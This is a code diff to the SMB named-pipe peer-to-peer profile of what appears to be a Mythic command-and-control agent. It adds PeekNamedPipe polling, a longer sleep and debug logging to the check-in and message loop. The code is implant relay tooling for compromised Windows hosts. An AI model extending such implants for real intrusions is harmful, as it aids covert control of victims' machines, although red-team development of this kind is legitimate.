@@ -87,6 +87,9 @@ proc WriteFile(hFile: HANDLE, lpBuffer: LPCVOID, nNumberOfBytesToWrite: DWORD,
                lpNumberOfBytesWritten: LPDWORD, lpOverlapped: LPOVERLAPPED): BOOL
 proc FlushFileBuffers(hFile: HANDLE): BOOL
 proc GetLastError(): DWORD
+proc PeekNamedPipe(hNamedPipe: HANDLE, lpBuffer: LPVOID, nBufferSize: DWORD,
+                   lpBytesRead: LPDWORD, lpTotalBytesAvail: LPDWORD, 
+                   lpBytesLeftThisMessage: LPDWORD): BOOL
 {.pop.}
 
 type
@@ -386,8 +389,10 @@ proc start*(profile: SmbProfile) =
       
       debug "[DEBUG] SMB P2P: Client connected"
       
-      # Give client time to set up reader thread
-      sleep(100)
+      # Give client time to set up reader and writer threads
+      # The linking agent now uses proper synchronization and waits
+      # for threads to be ready before returning
+      sleep(200)
       
       # Send checkin to link agent
       debug "[DEBUG] SMB P2P: Sending checkin to link agent"
@@ -404,11 +409,15 @@ proc start*(profile: SmbProfile) =
         continue
       
       debug "[DEBUG] SMB P2P: Waiting for checkin response from Mythic (via link agent)"
+      debug "[DEBUG] SMB P2P: pipeHandle=", profile.pipeHandle, ", about to call receiveChunkedMessage"
       
       # Wait for checkin response
       let checkinResp = receiveChunkedMessage(profile.pipeHandle)
+      debug "[DEBUG] SMB P2P: receiveChunkedMessage returned, len=", checkinResp.len
+      
       if checkinResp.len == 0:
-        debug "[DEBUG] SMB P2P: No checkin response, closing client"
+        let lastErr = GetLastError()
+        debug "[DEBUG] SMB P2P: No checkin response (error: ", lastErr, "), closing client"
         discard DisconnectNamedPipe(profile.pipeHandle)
         discard CloseHandle(profile.pipeHandle)
         profile.listening = false
@@ -436,8 +445,20 @@ proc start*(profile: SmbProfile) =
       
       while true:
         try:
-          # Wait for message from client
-          debug "[DEBUG] SMB P2P: Waiting for message from linking agent..."
+          # Poll for data using PeekNamedPipe to avoid blocking
+          var bytesAvail: DWORD = 0
+          if PeekNamedPipe(profile.pipeHandle, nil, 0, nil, addr bytesAvail, nil) == 0:
+            let err = GetLastError()
+            debug "[DEBUG] SMB P2P: PeekNamedPipe failed, error: ", err, ", client disconnected"
+            break
+          
+          if bytesAvail == 0:
+            # No data available, sleep briefly
+            sleep(100)
+            continue
+          
+          # Data available, read it
+          debug "[DEBUG] SMB P2P: ", bytesAvail, " bytes available, reading message"
           let clientMsg = receiveChunkedMessage(profile.pipeHandle)
           if clientMsg.len == 0:
             debug "[DEBUG] SMB P2P: Client disconnected"
